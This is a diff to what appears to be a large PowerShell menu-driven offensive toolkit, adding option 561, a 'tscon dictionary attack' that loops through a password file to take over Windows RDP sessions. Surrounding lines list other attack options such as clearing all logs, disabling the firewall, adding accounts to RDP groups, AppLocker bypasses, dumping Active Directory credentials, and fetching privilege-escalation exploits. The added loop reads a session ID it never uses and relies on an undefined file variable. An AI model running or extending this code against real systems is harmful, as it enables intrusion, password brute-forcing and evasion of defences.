@@ -398,7 +398,7 @@ while($true){
     write-host " 149. Reset Sec. Descriptor Propagator proc. for 3 mins`t`t135. winrm attack with winrs`t`t`t`t`t175. Clear all logs";
     write-host " 185. Check Remote Registry is running (starts if did not)`t195. Disable firewall`t`t`t`t`t`t196. add an account to RDP groups";
     write-host " 198. AppLockerBypass with rundll32 and shell32`t`t`t199. AppLockerBypass with rundll32`t`t`t`t205. Print only printable chars";
-    write-host " 214. Shred a file`t`t`t`t`t`t221. ActiveDirectory Enum";
+    write-host " 214. Shred a file`t`t`t`t`t`t221. ActiveDirectory Enum`t`t`t561. tscon dictionary attack";
     write-host " 215. Port forward all local addresses and all local ports to localhost and to specific local port v4 to v4";
     write-host " 222. Get Users about Service Principal Names (SPN) directory property for an Active Directory service account";
     write-host " 226. dump Active Directory creds with ndtsutil`t`t`t227. Analyze ADS in a file`t`t`t`t`t276. compute hash checksum of a file";
@@ -960,6 +960,7 @@ while($true){
         '558' {ScaricaRel "antonioCoco/RemotePotato0"}
         '559' {ScaricaRel "wdelmas/remote-potato"}
         '560' {ScaricaSSL "exploitblizzard/Windows-Privilege-Escalation-CVE-2021-1732" "Windows-Privilege-Escalation-CVE-2021-1732.zip" "exploitblizzard/Windows-Privilege-Escalation-CVE-2021-1732/archive/refs/heads/main.zip"}
+        '561' {if(Test-Path tscon){if(Test-Path query){query user; $TSID=read-host "Digit a session ID"; if($TSID -ne ""){foreach($TENT in get-content $FILE){tscon /password:$TENT}}}}}
         default{write-host 'ERROR: this choice is incorrect'}
     }
     read-host "Press ENTER to continue";
